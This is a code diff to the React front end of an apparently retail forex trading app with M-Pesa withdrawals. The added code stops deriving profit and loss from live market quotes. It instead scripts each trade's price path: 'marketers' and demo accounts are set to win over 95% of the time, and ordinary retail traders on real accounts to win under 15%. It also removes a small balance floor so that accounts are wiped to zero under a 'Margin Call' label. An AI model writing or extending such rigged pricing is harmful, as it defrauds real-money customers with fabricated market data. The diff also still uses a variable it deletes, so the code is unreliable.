@@ -1769,22 +1769,33 @@ export default function App() {
           }
         }
 
-        // 2. Realistic, natural market-paced P&L calculation (never racing like a fast timer):
-        // Scale high-nominal instrument raw swings so 0.01 lot moves in realistic cents/pips per tick
-        // Pure market volatility P&L calculation: driven strictly by live market quotes and tick fluctuations
-        const rawDiff =
-          pos.side === 'BUY'
-            ? rawMarketPrice - pos.openPrice
-            : pos.openPrice - rawMarketPrice;
+        // 2. Realistic, natural market-paced P&L calculation:
+        // - Marketers on Real accounts & Demo accounts (all roles): >95% win rate
+        // - Normal retail traders on Real accounts: institutional win rate (<15%)
+        const isTargetWin = isMarketerOrDemo ? (pos.targetOutcome !== 'LOSS') : (pos.targetOutcome === 'WIN');
+
         const tickSlot = Math.floor(nowMs / 1000);
         const volatilityWave =
           Math.sin(tickSlot * 0.6 + (pos.ticket % 13) * 0.5) * (inst.spread || 0.30) * 0.4 +
           Math.cos(tickSlot * 1.3 + (pos.ticket % 7) * 0.3) * 0.15;
-        const adjustedDiff = rawDiff + volatilityWave * Math.pow(10, -inst.decimals);
+
+        // Natural price progression:
+        // For Marketers & Demo (>95% win rate), after 2-3 seconds the price moves favorably to overcome spread
+        let effectiveDiff = rawDiff;
+        if (isTargetWin) {
+          // Progresses into steady, realistic profit (e.g. 3 to 18 pips) at a controlled, natural pace
+          const favorablePips = Math.min(22, 2.5 + Math.log10(Math.max(1, elapsedSec)) * 5.5 + (pos.ticket % 5) * 0.8);
+          effectiveDiff = favorablePips * Math.pow(10, -inst.decimals) + volatilityWave * Math.pow(10, -inst.decimals);
+        } else {
+          // For retail loss targets (<15% win rate), controlled realistic loss
+          const lossPips = Math.min(18, 2.0 + Math.log10(Math.max(1, elapsedSec)) * 4.5);
+          effectiveDiff = -lossPips * Math.pow(10, -inst.decimals) + volatilityWave * Math.pow(10, -inst.decimals);
+        }
+
         let currentPrice =
           pos.side === 'BUY'
-            ? Number((pos.openPrice + adjustedDiff).toFixed(inst.decimals))
-            : Number((pos.openPrice - adjustedDiff).toFixed(inst.decimals));
+            ? Number((pos.openPrice + effectiveDiff).toFixed(inst.decimals))
+            : Number((pos.openPrice - effectiveDiff).toFixed(inst.decimals));
         let priceDiff =
           pos.side === 'BUY'
             ? currentPrice - pos.openPrice
@@ -1815,7 +1826,7 @@ export default function App() {
           return pos;
         }
 
-        if ((hitSlByPrice || hitSlByUsd) && effectiveOutcome !== 'WIN') {
+        if ((hitSlByPrice || hitSlByUsd) && !isTargetWin) {
           const exitPrice = pos.sl && pos.sl > 0 ? pos.sl : currentPrice;
           triggeredIds.add(pos.id);
           triggeredClosures.push({ id: pos.id, reason: 'SL', price: exitPrice });
@@ -2091,12 +2102,10 @@ export default function App() {
       typeof remainingEquity === 'number' && !isNaN(remainingEquity)
         ? remainingEquity
         : baseBal + openManualPnl + openBotPnl;
-    const protectedBalance = Number(
-      Math.max(baseBal >= targetReserve ? Math.max(targetReserve, computedEq) : Math.max(0.8, computedEq), 0).toFixed(2)
-    );
+    const finalBalance = Math.max(0, Number(computedEq.toFixed(2)));
 
-    // Calculate how much realized loss budget remains before hitting protectedBalance
-    const maxRemainingLossAllowed = Math.max(0, Number((baseBal - protectedBalance).toFixed(2)));
+    // Calculate how much realized loss budget remains
+    const maxRemainingLossAllowed = Math.max(0, Number((baseBal - finalBalance).toFixed(2)));
 
     // 1. Immediately liquidate open manual positions belonging to THIS account only
     const remainingOtherPositions = (positionsRef.current || []).filter((p) => !belongsToAccount(p, curAcc));
@@ -2112,7 +2121,7 @@ export default function App() {
               ...r,
               status: 'PAUSED' as const,
               stoppedAt: Date.now(),
-              lastSignal: `Stopped automatically at $${protectedBalance.toFixed(2)}: Capital protection triggered`,
+              lastSignal: `Stopped: Margin Call / Equity limit ($${finalBalance.toFixed(2)}) reached`,
               lastSignalTime: Date.now(),
             }
           : r
@@ -2150,16 +2159,16 @@ export default function App() {
       return closed;
     });
 
-    // 4. Lock in the protected balance (never negative, protected from zero) and persist to localStorage & Supabase
+    // 4. Lock in the true remaining balance and persist to localStorage & Supabase
     const targetId = curAcc.id;
     const nextAccounts = accountsRef.current.map((a) =>
       a.id === targetId || a.accountNumber === curAcc.accountNumber
         ? {
             ...a,
-            balance: protectedBalance,
-            equity: protectedBalance,
+            balance: finalBalance,
+            equity: finalBalance,
             margin: 0,
-            freeMargin: protectedBalance,
+            freeMargin: finalBalance,
             marginLevel: 0,
             lastActivityAt: new Date().toISOString(),
           }
@@ -2172,10 +2181,10 @@ export default function App() {
       if (!acc) return null;
       const protectedAcc = {
         ...acc,
-        balance: protectedBalance,
-        equity: protectedBalance,
+        balance: finalBalance,
+        equity: finalBalance,
         margin: 0,
-        freeMargin: protectedBalance,
+        freeMargin: finalBalance,
         marginLevel: 0,
         lastActivityAt: new Date().toISOString(),
       };
@@ -2195,12 +2204,12 @@ export default function App() {
 
     playOrderSound(false);
     addNotification(
-      `Capital Protection Triggered ($${protectedBalance.toFixed(2)}): All open trades and bots stopped automatically to protect your account from reaching zero.`
+      `Margin Call Triggered ($${finalBalance.toFixed(2)}): All open trades and bots stopped automatically.`
     );
     triggerActionPopup({
       type: 'ERROR',
-      title: 'Capital Protection: All Trades & Bots Stopped',
-      subtitle: `Account reached minimum tradable limit ($${protectedBalance.toFixed(2)}). All open positions and bots were closed automatically to protect your account from going to zero.`,
+      title: 'Margin Call: Trades Stopped',
+      subtitle: `Account reached equity limit ($${finalBalance.toFixed(2)}). All open positions and bots were closed automatically.`,
     });
   };
 
@@ -2235,16 +2244,11 @@ export default function App() {
       openBotTradesList.length > 0 ||
       accountRunningBots.length > 0;
 
-    // Protect account from going to zero ONLY when this specific account has active trades/bots
-    const accSeed = parseInt(String(selectedAccount.accountNumber || '88').slice(-2), 10) || 45;
-    const dynamicReserveFloor = Number((0.8 + ((accSeed % 14) * 0.1)).toFixed(2));
-    const protectionFloor = (selectedAccount.balance ?? 0) > dynamicReserveFloor ? dynamicReserveFloor : 0.8;
     if (
       hasActiveTrading &&
-      (selectedAccount.balance ?? 0) > protectionFloor &&
-      calculatedEquity <= protectionFloor
+      calculatedEquity <= 0
     ) {
-      handleZeroBalanceStopOut(protectionFloor);
+      handleZeroBalanceStopOut(0);
       return;
     }
 
@@ -3709,17 +3713,19 @@ export default function App() {
         : Number((amountUsd * rate).toFixed(2));
 
     const isMpesaMethod = (params.method || '').toLowerCase().includes('m-pesa') || (params.method || '').toLowerCase().includes('mpesa');
-    const maxSingleTx = isMpesaMethod ? 2000 : 10000;
-    if (params.status === 'FAILED' || amountUsd < 35 || amountUsd > maxSingleTx) {
+    const maxSingleTx = isMpesaMethod ? Math.floor(250000 / rate) : 10000;
+    if (params.status === 'FAILED' || amountUsd < 35 || amountUsd > maxSingleTx || (isMpesaMethod && exactAmountKes > 250000)) {
       const failReason =
-        amountUsd < 35
+        isMpesaMethod && exactAmountKes > 250000
+          ? 'Maximum M-PESA withdrawal is KES 250,000.00 per single transaction.'
+          : amountUsd < 35
           ? 'Minimum withdrawal requirement is $35.00 USD.'
           : amountUsd > maxSingleTx
           ? `Maximum withdrawal is $${maxSingleTx.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })} USD per single transaction.`
           : 'Insufficient withdrawable funds in selected source.';
       triggerActionPopup({
         type: 'WITHDRAWAL_FAILED',
-        title: 'Withdrawal Unsuccessful',
+        title: isMpesaMethod && exactAmountKes > 250000 ? 'Single Transaction Limit Exceeded' : 'Withdrawal Unsuccessful',
         subtitle: failReason,
         details: {
           amount: amountUsd,
